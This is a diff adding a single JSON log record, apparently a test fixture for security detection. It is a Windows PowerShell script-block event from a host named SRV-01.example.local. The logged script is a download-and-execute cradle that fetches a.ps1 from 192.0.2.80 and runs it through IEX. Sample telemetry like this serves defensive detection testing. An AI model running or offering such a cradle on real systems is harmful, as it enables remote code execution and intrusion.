@@ -1,0 +1,1 @@
+{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "eventID": "4104", "channel": "Microsoft-Windows-PowerShell/Operational", "severityValue": "WARNING", "computer": "SRV-01.example.local", "systemTime": "2026-11-21T10:00:00.000000000Z", "level": "0"}, "eventdata": {"scriptBlockText": "(New-Object Net.WebClient).DownloadString('http://192.0.2.80/a.ps1') | IEX"}}}
